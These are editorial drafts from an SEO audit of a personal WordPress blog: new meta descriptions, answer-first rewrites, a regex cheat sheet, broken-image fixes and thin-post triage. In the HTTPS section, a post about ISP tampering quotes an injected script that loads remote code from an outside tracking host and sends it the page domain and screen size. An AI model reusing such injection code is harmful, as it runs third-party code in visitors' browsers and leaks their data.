# Editorial drafts from the SEO, AEO and GEO audit

Drafts for review. Nothing here is applied yet. Edit freely, then mark each
item **ok** and I'll apply it. Item IDs match the audit report and
`2026-10-30-seo-aeo-geo-improvements-design.md`.

Meta descriptions are under 155 characters so Google rarely truncates them.

## 1. Page titles and meta descriptions (`ONPAGE-04`)

| Page | Field | Now | Draft |
| --- | --- | --- | --- |
| Home (ID 26) | Description | Explore WordPress, AI, performance, and developer tooling for enhanced web experiences in this insightful blog. | I'm Ivan Kristianto, a web engineer in Jakarta. Tutorials, notes and experiments on WordPress, web performance, AI agents and developer tooling. |
| About (ID 16) | SEO title | Web Engineer, WordPress, Performance, AI Insights | About Ivan Kristianto |
| About (ID 16) | Description | Explore the world of web engineering with insights into WordPress, performance, AI, and essential developer tools. | Ivan Kristianto is a Senior Web Engineer at Human Made and a Google Developer Expert for Web, working on WordPress, performance and developer tooling. |
| Resume (ID 18) | Description | (none) | Resume of Ivan Kristianto: Senior Web Engineer and Google Developer Expert (Web) with 15+ years on WordPress, web performance and developer tooling. |
| Articles (ID 13) | Description | (none) | Every article on this site, newest first: guides, deep dives and short notes on WordPress, web performance, AI agents and developer tooling. |
| Projects (ID 14) | Description | (none) | Open-source tools I build and maintain, from WordPress plugins and CLI tools to the theme behind this site, with what each one does. |
| Speaking (ID 15) | Description | (none) | Talks, workshops and webinars on WordPress, web performance and engineering workflows, and the WordPress events I've organised in Indonesia since 2015. |
| Contact (ID 17) | Description | (none) | How to reach me: email for work, talks and mentoring, GitHub for code, and where else I'm online. |
| Accessibility (ID 2001) | Description | (none) | How this site measures up to WCAG 2.2 Level AA: every criterion tested, what passes, what fails, and what I'm fixing next. |
| Privacy (ID 19) | Description | (none) | What this site collects when you visit, why, and how long it keeps it. Check this against the page before applying. |

About page body, one change so the full name appears in visible text (it
appears nowhere on home, /about/ or a post today):

- H1 `About Ivan` → `About Ivan Kristianto`
- First sentence `I'm a web engineer who works on...` → `I'm Ivan Kristianto, a web engineer who works on...`

Old posts with the most Search Console clicks also need descriptions. I
don't have Search Console access, so send me the top 20 to 30 URLs from
Performance > Pages (last 12 months) and I'll draft those.

## 2. Answer-first edits on recent posts (`AEO-02`, `AEO-03`, `AEO-05`)

### How a split webfont slowed down my text layout

Move paragraph 3 ("The short version: ...") to the top, unchanged. The post
then opens with the result and the rule, and the audit story follows:

> The short version: the tool that split the font into small files put a few common English letters, i and j among them, in a different file from the rest of the alphabet. When one word needs two font files, the browser lays it out in more than one pass, and that takes longer. Keep basic Latin in one file and don't let unicode-range ...
>
> Last week I was auditing a client's multilingual WordPress multisite and found a performance regression ...

Turn the three timing blocks in `<pre>` into `core/table` blocks with a
header row. Same numbers, no wording changes:

| Setup | Layout time |
| --- | --- |
| Noto Sans, Latin in one file | 3.2 ms |
| Noto Sans, Latin in three files | 6.0 ms |
| Noto Sans SC, Latin in one file | 3.3 ms |
| Noto Sans SC, cn-font-split output | 4.7 ms |
| Arial | 2.0 ms |

| Font stack on the Arabic pages | Layout time |
| --- | --- |
| webfont first, then sans-serif | 17.9 ms |
| Geeza Pro first, then the webfont | 7.2 ms |
| sans-serif only | 15.1 ms |

| unicode-range setup | Layout time |
| --- | --- |
| real Latin file only | 3.3 ms |
| overlapping ranges, Latin declared first | 6.1 ms |
| overlapping ranges, Latin declared last | 3.3 ms |
| no overlap, either order | 3.4 to 3.7 ms |

### Adding read-only WebMCP tools to my WordPress blog

Paragraph 1, add a definition so the page answers "what is WebMCP" before
the first heading:

> On October 25, 2026, I added WebMCP tools to this blog. WebMCP is a proposed web API that lets a page describe functions a browser agent can discover and call. Here, an agent in a compatible browser can search the articles, list them by topic, and read one in full. The implementation went into v0.14.0.[8][9]

Paragraph 4 then repeats the definition. Trim it to start at the second
sentence: "Each tool has a name, a description, an input schema, and a
JavaScript callback. It's still a proposed web API, not a completed W3C
standard."

One heading phrased the way people search:

- `Test the API before asking an assistant` → `How to test WebMCP tools in Chrome`

### How to code with AI agents

Add a short list after paragraph 2 so the page holds an answer of its own,
not only a link (the Human Made article stays the full version):

> The short version:
>
> 1. Write the spec first, then build from a plan the agent and I both reviewed.
> 2. Run quality gates on every commit so the agent catches its own mistakes.
> 3. Give each branch its own worktree and environment.
> 4. Run agents in parallel on separate tasks.
> 5. Throw away code that misses. It's cheap to regenerate.

### Why You Should Always Use Site with HTTPS

Lead with the claim, then the story. New opening paragraph:

> If your site doesn't use HTTPS, anyone between you and your visitors can change the page they get. My own ISP did it: it injected a tracking script into every plain HTTP page I loaded.

Below the screenshot, put the script in a code block (the screenshot then
gets alt text "Script my ISP injected before the closing body tag"). The
encoded payload is shortened:

```html
<script type="text/javascript">
if (self == top) {
  function netbro_cache_analytics(fn, callback) { setTimeout(function () { fn(); callback(); }, 0); }
  function sync(fn) { fn(); }
  function requestCfs() {
    var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
    var idc_glo_r = Math.floor(Math.random() * 99999999999);
    var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K..." + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
    var bsa = document.createElement('script');
    bsa.type = 'text/javascript'; bsa.async = true; bsa.src = url;
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
  }
  netbro_cache_analytics(requestCfs, function () {});
}
</script>
```

Title, optional: `Why You Should Always Use Site with HTTPS` →
`Why every site needs HTTPS: my ISP injected scripts into HTTP pages`.

## 3. Regular Expressions Cheat Sheet (`AEO-07`)

The post's answer is one PNG plus a PDF link that now 404s. Proposed
replacement body, written fresh (not copied from the image), keeping the
image and the credit:

> A one-page regex reference: anchors, character classes, quantifiers, groups, lookarounds and flags, with an example for each. Syntax follows PCRE, which PHP, JavaScript and most editors share for everything below.

**Anchors**

| Token | Matches | Example |
| --- | --- | --- |
| `^` | Start of string (or line with `m`) | `^Hello` |
| `$` | End of string (or line with `m`) | `world$` |
| `\b` | Word boundary | `\bcat\b` matches "cat", not "concat" |
| `\B` | Not a word boundary | `\Bcat` matches "concat" |

**Character classes**

| Token | Matches | Example |
| --- | --- | --- |
| `.` | Any character except newline | `a.c` matches "abc" |
| `\d` / `\D` | Digit / not a digit | `\d{4}` matches "2026" |
| `\w` / `\W` | Word character `[A-Za-z0-9_]` / not | `\w+` |
| `\s` / `\S` | Whitespace / not | `\s+` |
| `[abc]` | One of a, b, c | `gr[ae]y` |
| `[^abc]` | Anything but a, b, c | `[^0-9]` |
| `[a-z]` | A range | `[A-Fa-f0-9]` |

**Quantifiers**

| Token | Matches | Example |
| --- | --- | --- |
| `*` | 0 or more | `ab*` |
| `+` | 1 or more | `\d+` |
| `?` | 0 or 1 | `colou?r` |
| `{n}` / `{n,}` / `{n,m}` | Exactly n / n or more / n to m | `\d{2,4}` |
| `*?`, `+?`, `??` | Lazy versions: match as little as possible | `<.+?>` |

**Groups and lookarounds**

| Token | Matches | Example |
| --- | --- | --- |
| `(abc)` | Capturing group | `(\d+)-(\d+)` |
| `(?:abc)` | Group without capturing | `(?:https?://)?` |
| `(?<name>abc)` | Named group | `(?<year>\d{4})` |
| `a\|b` | a or b | `cat\|dog` |
| `\1` | Back-reference to group 1 | `(\w)\1` matches "ll" |
| `(?=abc)` / `(?!abc)` | Followed / not followed by | `\d+(?= px)` |
| `(?<=abc)` / `(?<!abc)` | Preceded / not preceded by | `(?<=\$)\d+` |

**Flags**

| Flag | Effect |
| --- | --- |
| `i` | Case-insensitive |
| `g` | All matches, not just the first (JavaScript) |
| `m` | `^` and `$` match at line breaks |
| `s` | `.` also matches newline |
| `u` | Unicode mode |
| `x` | Ignore whitespace in the pattern (PCRE) |

Other fixes on this post:

- Remove "Download Regular Expressions Cheat Sheet" (the PDF 404s), or
  upload the PDF if you still have it.
- Keep the PNG below the tables with alt text "Regular expressions cheat
  sheet, one-page PNG", and keep the source credit.
- Featured image: switch from `07-19_css_shorthand_cheat_sheet.png` (a CSS
  sheet, 550x250) to the regex PNG.

## 4. Broken images in old posts (`ONPAGE-07`)

| Post | Image | Proposal |
| --- | --- | --- |
| /simple-create-order-module-zen-cart/ | `createorder.jpg` on `ivankristianto.local` | Point at the media copy (WP-CLI block in the PR) |
| same post | `customer.jpg`, `order.jpg` | No copy exists. Remove |
| /launching-my-online-resume/ | `online-resume.png` | Remove |
| /repair-missing-icon-in-windows-7/ | `missing-icon.png` | Remove, or retire the post (see triage) |
| /mozilla-thunderbird-complete-powerful-and-free-email-client/ | `screenshot-oneclick.jpg` (twice) | Remove |
| /web-browser-benchmark-tools/ | Chrome 12, Firefox 4, IE9 Acid3 screenshots | Remove; the text still states the results |
| /facebook-now-have-video-call/ | `FBVideoCallSetup.png`, `videocall.png` | Remove, or retire the post |
| /git-introduction/ | `Distributed_Vs_Centralized.jpg` | Replace with a short text comparison, or a new diagram |
| /maxcdn-vs-google-app-engine-simple-benchmarking/ | 4 benchmark images on the dead CDN | Remove; the post is a 2010-era benchmark, consider keep-dated |

Four posts also link to old posts on `ivankristianto.local`. Those links get
rewritten to `https://www.ivankristianto.com/<slug>/` by the WP-CLI block.

## 5. Thin posts

Proposed decisions for the 228 posts under 250 words are in
`2026-10-30-thin-posts-triage.tsv`, one reason per post. Review that file
and change any decision; nothing is noindexed or redirected until you
approve.

| Decision | Posts | What happens |
| --- | --- | --- |
| keep-dated | 100 | Add a one-line "written for X" note (the reason column names X) |
| update | 41 | Still-searched fixes (nginx 413/504, "headers already sent", swap file, SSH port, netplan static IP). Expand when there's time |
| merge | 26 | Fold into the named target, 301 the old slug. Every target is itself kept |
| retire | 60 | Release write-ups, status and holiday notes, link-only posts, expired calls. Noindex, or delete with a 301 |
| link-post | 1 | /how-to-code-with-ai-agents/, no action beyond 2 above |

Closest calls, worth a look first:

- /all-the-web-talks-from-google-io-2019/ is keep-dated only because talk posts were never retired. It's a link to someone else's playlist.
- /upgraded-to-ubuntu-15-04/ and /wordpress-4-1-3/ are keep-dated, but on content alone they're 19 and 27 word status notes. Retire is defensible.
- /cloudflare-api-cli-tool/ and /introducing-create-wp-site/ are keep-dated pointers to your own tools. Make them update if you still maintain them.
- /cheat-your-professor-with-trash-file/ is retire: how-to shaped, but dubious advice and a dead link.
- /hirens-bootcd-11-0/ and /pidgin-v2-5-8-update-fix-yahoo-messenger-problem/ merge into older, shorter posts, because the target is the how-to and the source is a version note.
